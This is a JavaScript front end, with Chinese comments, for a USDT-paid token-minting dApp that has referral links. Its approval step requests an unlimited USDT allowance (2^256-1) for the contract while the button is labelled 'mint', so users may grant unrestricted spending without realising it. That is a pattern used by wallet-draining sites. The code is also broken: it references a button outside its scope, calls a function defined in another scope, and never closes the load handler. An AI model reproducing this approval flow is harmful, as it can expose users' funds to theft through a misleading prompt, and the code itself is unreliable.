// Web3 和合约实例
let web3;
let contract;
let usdtContract;
let userAddress;

// 初始化 Web3
async function initWeb3() {
    if (window.ethereum) {
        try {
            // 请求用户授权
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
            usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
            
            // 获取用户地址
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            
            // 更新UI
            updateWalletUI();
            updateAllowance();
            
            // 监听账户变化
            window.ethereum.on('accountsChanged', function (accounts) {
                userAddress = accounts[0];
                updateWalletUI();
                updateAllowance();
            });
        } catch (error) {
            console.error('用户拒绝授权:', error);
        }
    } else {
        console.error('请安装 MetaMask!');
    }
}

// 更新钱包UI
function updateWalletUI() {
    const connectWalletBtn = document.getElementById('connectWallet');
    if (userAddress) {
        const shortAddress = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
        connectWalletBtn.innerHTML = `<span class="flex items-center"><i class="fas fa-check-circle mr-2"></i> ${shortAddress}</span>`;
        connectWalletBtn.classList.remove('border-primary');
        connectWalletBtn.classList.add('border-secondary', 'text-secondary');
        
        // 更新邀请链接区域
        setupInviteSection();
    }
}

// 从URL中获取推荐人地址
function getReferrerFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const referrer = urlParams.get('ref');
    
    // 检查是否是有效的以太坊地址
    if (referrer && /^0x[a-fA-F0-9]{40}$/.test(referrer)) {
        return referrer;
    }
    // 如果没有有效的推荐人地址，返回零地址
    return '0x0000000000000000000000000000000000000000';
}

// 更新授权额度显示
async function updateAllowance() {
    try {
        const allowance = await usdtContract.methods.allowance(userAddress, CONTRACT_ADDRESS).call();
        const pricePerUnit = await contract.methods.pricePerUnit().call();
        const units = parseInt(document.getElementById('mintAmount').value);
        const totalAmount = web3.utils.toBN(pricePerUnit).mul(web3.utils.toBN(units));
        
        const mintButton = document.getElementById('mintButton');
        if (web3.utils.toBN(allowance).lt(totalAmount)) {
            mintButton.innerHTML = '<span class="relative z-10">mint </span>';
            mintButton.onclick = approveUSDT;
        } else {
            mintButton.innerHTML = '<span class="relative z-10">立即铸造</span>';
            mintButton.onclick = () => {
                const units = parseInt(document.getElementById('mintAmount').value);
                if (units > 0) {
                    mintTokens(units);
                }
            };
        }
    } catch (error) {
        console.error('获取授权额度失败:', error);
    }
}

// 授权 USDT
async function approveUSDT() {
    try {
        const mintButton = document.getElementById('mintButton');
        mintButton.innerHTML = '<span class="flex items-center justify-center"><i class="fas fa-spinner fa-spin mr-2"></i> mint...</span>';
        mintButton.disabled = true;

        // 使用最大授权金额
        const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // 2^256 - 1

        // 授权 USDT
        await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({
            from: userAddress
        });

        mintButton.innerHTML = '<span class="flex items-center justify-center"><i class="fas fa-check-circle mr-2"></i> 授权成功</span>';
        mintButton.classList.remove('from-primary', 'to-secondary');
        mintButton.classList.add('bg-green-500');

        // 更新按钮状态
        setTimeout(() => {
            updateAllowance();
        }, 2000);
    } catch (error) {
        console.error('mint失败:', error);
        mintButton.innerHTML = '<span class="flex items-center justify-center"><i class="fas fa-times-circle mr-2"></i> mint失败</span>';
        mintButton.classList.remove('from-primary', 'to-secondary');
        mintButton.classList.add('bg-red-500');
    } finally {
        setTimeout(() => {
            mintButton.disabled = false;
            mintButton.classList.remove('bg-red-500', 'bg-green-500');
            mintButton.classList.add('from-primary', 'to-secondary');
        }, 3000);
    }
}


// 购买代币
async function mintTokens(units) {
    try {
        const mintButton = document.getElementById('mintButton');
        mintButton.innerHTML = '<span class="flex items-center justify-center"><i class="fas fa-spinner fa-spin mr-2"></i> 铸造中...</span>';
        mintButton.disabled = true;

        // 获取推荐人地址
        const referrer = getReferrerFromURL();

        // 调用合约的 mint 方法
        await contract.methods.mint(referrer, units).send({
            from: userAddress
        });

        mintButton.innerHTML = '<span class="flex items-center justify-center"><i class="fas fa-check-circle mr-2"></i> 铸造成功</span>';
        mintButton.classList.remove('from-primary', 'to-secondary');
        mintButton.classList.add('bg-green-500');
    } catch (error) {
        console.error('铸造失败:', error);
        mintButton.innerHTML = '<span class="flex items-center justify-center"><i class="fas fa-times-circle mr-2"></i> 铸造失败</span>';
        mintButton.classList.remove('from-primary', 'to-secondary');
        mintButton.classList.add('bg-red-500');
    } finally {
        setTimeout(() => {
            mintButton.disabled = false;
            mintButton.innerHTML = '<span class="relative z-10">立即铸造</span>';
            mintButton.classList.remove('bg-red-500', 'bg-green-500');
            mintButton.classList.add('from-primary', 'to-secondary');
            updateAllowance();
        }, 3000);
    }
}

// 更新价格显示
async function updatePriceDisplay() {
    try {
        const pricePerUnit = await contract.methods.pricePerUnit().call();
        const priceInUsdt = web3.utils.fromWei(pricePerUnit, 'ether');
        document.querySelector('.text-xl.font-bold.text-primary').textContent = `${priceInUsdt} USDT`;
    } catch (error) {
        console.error('获取价格失败:', error);
    }
}

// 创建动态粒子
function createParticles() {
const container = document.getElementById('particles');
const particleCount = 30;
for (let i = 0; i < particleCount; i++) {
const particle = document.createElement('div');
particle.classList.add('particle');
const size = Math.random() * 5 + 1;
const posX = Math.random() * 100;
const posY = Math.random() * 100;
const duration = Math.random() * 20 + 10;
const delay = Math.random() * 5;
particle.style.width = `${size}px`;
particle.style.height = `${size}px`;
particle.style.left = `${posX}%`;
particle.style.top = `${posY}%`;
particle.style.animationDuration = `${duration}s`;
particle.style.animationDelay = `${delay}s`;
container.appendChild(particle);
}
}

window.addEventListener('load', function() {

document.getElementById('connectWallet').addEventListener('click', initWeb3);

// Mint数量调整
const mintAmount = document.getElementById('mintAmount');
const minusBtn = mintAmount.previousElementSibling;
const plusBtn = mintAmount.nextElementSibling;
minusBtn.addEventListener('click', function() {
    let value = parseInt(mintAmount.value);
    if (value > 1) {
        mintAmount.value = value - 1;
        updateAllowance();
    }
});
plusBtn.addEventListener('click', function() {
    let value = parseInt(mintAmount.value);
    mintAmount.value = value + 1;
    updateAllowance();
});

// 监听输入框变化
mintAmount.addEventListener('input', function() {
    updateAllowance();
});

// 生成邀请链接并处理复制功能
function setupInviteSection() {
    const inviteSection = document.getElementById('inviteSection');
    const inviteLinkInput = document.getElementById('inviteLink');
    const copyButton = document.getElementById('copyInviteLink');
    
    // 只有连接钱包后才显示邀请部分
    if (userAddress) {
        // 显示邀请区域
        inviteSection.style.display = 'block';
        
        // 生成邀请链接
        const currentUrl = window.location.origin + window.location.pathname;
        const inviteLink = `${currentUrl}?ref=${userAddress}`;
        inviteLinkInput.value = inviteLink;
        
        // 复制按钮功能
        copyButton.addEventListener('click', function() {
            inviteLinkInput.select();
            document.execCommand('copy');
            
            // 显示复制成功提示
            const originalText = copyButton.innerHTML;
            copyButton.innerHTML = '<i class="fas fa-check"></i>';
            setTimeout(() => {
                copyButton.innerHTML = originalText;
            }, 2000);
        });
    } else {
        inviteSection.style.display = 'none';
    }
}
